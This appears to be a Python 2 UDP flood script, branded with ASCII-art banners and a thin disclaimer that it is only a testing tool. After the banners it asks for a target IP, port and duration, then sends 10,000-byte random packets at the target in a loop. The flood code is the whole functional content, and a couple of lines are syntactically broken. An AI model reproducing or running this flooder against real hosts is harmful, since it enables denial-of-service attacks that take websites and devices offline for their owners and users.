
wi = "\033[1;37m" 
rd = "\033[1;31m" 
gr = "\033[1;32m" 
yl = "\033[1;33m" 
pu = "\033[1;35m" 
b="\033[1;34m"
import os
import socket
import time 
import random
import sys
           
def doss():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payloads = random._urandom(10000)

    os.system("clear")   

    print gr+'''   
       
                     _______   _______               _____   _  __
             /\     |__   __| |__   __|     /\      / ____| | |/ /
            /  \       | |       | |       /  \    | |      | ' /
           / /\ \      | |       | |      / /\ \   | |      |  <
          / ____ \     | |       | |     / ____ \  | |____  | . \

         /_/    \_\    |_|       |_|    /_/    \_\  \_____| |_|\_\

         
        '''

    print (rd+"           ")
    print ("                           `...-...........`  ")
    print ("                           `-:/::::--------:///-   ")
    print ("                         .//::::--...```.....--/o:`     ")
    print ("                       `:+/::::--.`         ``..:oo-    ")
    print ("                      `/+////:--.`             `.-+y/   "
    print ("                      :+///+/:--..`             `.:+y/    ")
    print ("                     -+///o+::::--...``         ``-:oy-    ")
    print ("                    `/+/+/oo/:-----::::-.`      ``.:+ys    ")
    print ("      -/....        .+o+s/o:.``  `.----//:-``````.::+yy      ")
    print ("      :+so:`.       .ossh++:.``     `.:--/o/:----:::+ys      ")
    print ("      `/so.``       `oyhdyosys+:``    .//:/soo++//::sy:      ")
    print ("      -o//:.`.       `ydy+/-sNdo+:.`  `.s+-/yhyyo+:ohy.      ")
    print ("     `///sys:```      -+++-`sd-./+o/-` `/s/-oo/::::-.:y+      ")
    print ("       `````:+-`.`    `:/s/.`//:/:/hy/.`-syo+-..`````/s+        ")
    print ("             `:+.`.`   `-/++.`-/oshdsoyyyysh/-+shmmo/-`    ")898836
    print ("               `+/`.-`  :y++s+:.`.``.:yh+yhomNNNMm/+      ")
    print ("                 -+:`-:-s+:oh++/+++osyoyyhmsysyys-o/       .::.     ")
    print ("                  `/o.`/+:+/ho://://+o/o+oyo+--///-       /y/.:.     ")
    print ("                    .+/.:+s+::o++-/::/://+++o:`        `-+o:`--     ")
    print ("                      -o/+o++-/Nd/::.-.-:::+/    `.-::::-```.s-       ")
    print ("                       `+ho+/:-dMNMNy:/y+/::`.-:::-```......./:     ")
    print ("                         .o++/:/dNmmm/:++::::.``......`    ")
    print ("                           /++/::::++/+/-.`.--..`     ")
    print ("                           `+s+/+/:/+s-::--`   ")
    print ("                        `.:///oyo+++//+`    ")
    print ("                    .-:::-..-:++---://-:`      ")
    print ("               `-:::-``----.`      `:o:`--`    ")
    print ("       `....-:/:-``---.`             `:+:.-.     ")
    print ("     --`..-..``--.`                   `-+-.-.      ")
    print ("    `+/:/:```-.                         `:/..:-`     ")
    print ("       `/y- -`                            `/+/.....-    ")
    print ("       `++:.                               +o```-::    ")
    print ("                                            `+/:/-      ")




    print (gr+"              ")                              
    print ("           _____    ______  __      __  _____  __ ")
    print ("          |  __ \  |  ____| \ \    / / |_   _| | |     ")
    print ("          | |  | | | |__     \ \  / /    | |   | |       ") 
    print ("          | |  | | |  __|     \ \/ /     | |   | |         ")
    print ("          | |__| | | |____     \  /     _| |_  | |____    ")
    print ("          |_____/  |______|     \/     |_____| |______|   ")

    print ("            __                 _____                          ____             ")
    print ("    /\     | |                / ____|     /\         /\      / __ \        ")
    print ("   /  \    | |       ______  | (___      /  \       /  \    | |  | |     ")
    print ("  / /\ \   | |      |______|  \___ \    / /\ \     / /\ \   | |  | |         ")
    print (" / ____ \  | |____            ____) |  / ____ \   / ____ \  | |__| |      ")
    print ("/_/    \_\ |______|          |_____/  /_/    \_\ /_/    \_\  \___\_\          ")
    print ("      ")
    print ("( ALLAH AKBAR ) ")
    print (yl+"               ----------------------------- WELCOME -----------------------------")
    print ("     ")
    print (rd+"-----------------------------------------------------------------------------   ")
    print (gr+"[ This is a special tool for testing attacks on websites and devices,") 
    print (   "and we are not responsible for any illegal use of the tool ]")
    print (rd+"-----------------------------------------------------------------------------   ")
    print ("   ")
    print (yl+"----------------------------- This Tool Is Programmed Py DEVIL ALSAAQ -----------------------------")        
    print'\n'
    print'\n'
    ip = raw_input("\033[1;33m[*] \033[1;31mip \033[1;31mor \033[1;31mhost \033[1;31mTarget \033[1;37m: ")
    port = input("\033[1;33m[*] \033[1;34mport \033[1;34m[Default \033[1;34mport \033[1;34m80 ] \033[1;37m: ")
    seconds = input("\033[1;33m[*] \033[1;32mtime \033[1;32mthe \033[1;32mAttack \033[1;37m: ")
    timeout = time.time() + seconds

    sent = 1/2 

    while True:

        try:

            if time.time() > timeout:
                break

            else:
                pass
            sock.sendto(payloads,(ip,port))
            sent = 1
            print '   '
            print (gr+'DDoss Attack \033[1;32mStarting.. \033[1;32mSystem \033[1;32mIs \033[1;32mFlashing.. \033[1;32mAttacks \033[1;32mAre \033[1;32mBeing \033[1;32mSent \033[1;32mon \033[1;32m%s .... ') % (ip)
            print     '    '
            print (gr+'DDoss Attack \033[1;32mStarting.. \033[1;32mSystem \033[1;32mIs \033[1;32mFlashing.. \033[1;32mAttacks \033[1;32mAre \033[1;32mBeing \033[1;32mSent \033[1;32mon \033[1;32m%s .... ') % (ip)
            print '     '                       
            print (gr+'DDoss Attack \033[1;32mStarting.. \033[1;32mSystem \033[1;32mIs \033[1;32mFlashing.. \033[1;32mAttacks \033[1;32mAre \033[1;32mBeing \033[1;32mSent \033[1;32mon \033[1;32m%s .... ') % (ip)
            print '     '
            print (gr+'DDoss Attack \033[1;32mStarting.. \033[1;32mSystem \033[1;32mIs \033[1;32mFlashing.. \033[1;32mAttacks \033[1;32mAre \033[1;32mBeing \033[1;32mSent \033[1;32mon \033[1;32m%s .... ') % (ip)                                    
            print '     '
            print (gr+'DDoss Attack \033[1;32mStarting.. \033[1;32mSystem \033[1;32mIs \033[1;32mFlashing.. \033[1;32mAttacks \033[1;32mAre \033[1;32mBeing \033[1;32mSent \033[1;32mon \033[1;32m%s .... ') % (ip)                                    
            print '     '
            print (gr+'DDoss Attack \033[1;32mStarting.. \033[1;32mSystem \033[1;32mIs \033[1;32mFlashing.. \033[1;32mAttacks \033[1;32mAre \033[1;32mBeing \033[1;32mSent \033[1;32mon \033[1;32m%s .... ') % (ip)                                    
            print '     '
            print (gr+'DDoss Attack Starting.. System Is Flashing.. Attacks Are Being Sent on %s .... ') % (ip)
        except KeyboardInterrupt:
            sys.exit()

doss()
